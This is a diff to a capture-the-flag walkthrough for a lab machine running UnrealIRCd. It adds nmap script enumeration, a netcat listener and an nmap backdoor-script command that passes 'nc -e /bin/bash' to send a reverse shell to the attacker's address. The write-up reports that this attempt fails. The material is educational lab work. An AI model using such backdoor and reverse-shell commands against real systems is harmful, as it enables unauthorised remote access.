@@ -41,12 +41,12 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 
 + Check other ports. Ports 22 OpenSSH 6.7p1, and port 111 rpcbind 2–4 aren't promising. Ports 6697, 8067 and 65534 runs UnrealIRCd.
 + Check if there are any nmap scripts for irc.
-+ To list related scripts: `ls /usr/share/nmap/scripts/irc*`
++ To list related scripts: `ls -l /usr/share/nmap/scripts/irc*`
 + **Alternatively**, `find /usr/share/nmap/scripts -name '*irc*'`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3d0e30f9-e813-4d2b-8100-6225d57fb637)
 
-+ Check `/usr/share/nmap/scripts/irc-unrealircd-backdoor.nse` script. It shows us that nmap detects if it's vulnerable, and also it starts a netcat listener that would give the attack machine a shell on the target system.
++ Check `/usr/share/nmap/scripts/irc-unrealircd-backdoor.nse` [nmap nse script](https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html). It shows us that nmap detects if it's vulnerable, and also it starts a netcat listener that would give the attack machine a shell on the target system.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/53d45740-786a-4444-bc30-86628f3f09f1)
 
@@ -59,7 +59,11 @@ nmap -d -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a12d7208-05bb-4714-b634-238d41c5519a)
 
-
++ Start a netcat listener on the attack machine: `nc -lnvp 4444`
++ Try to send a reverse shell to the attack machine netcat listener from the target machine. It fails, and no shell!
+```
+nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444" 10.10.10.117
+```
 
 
 ## Gaining Access
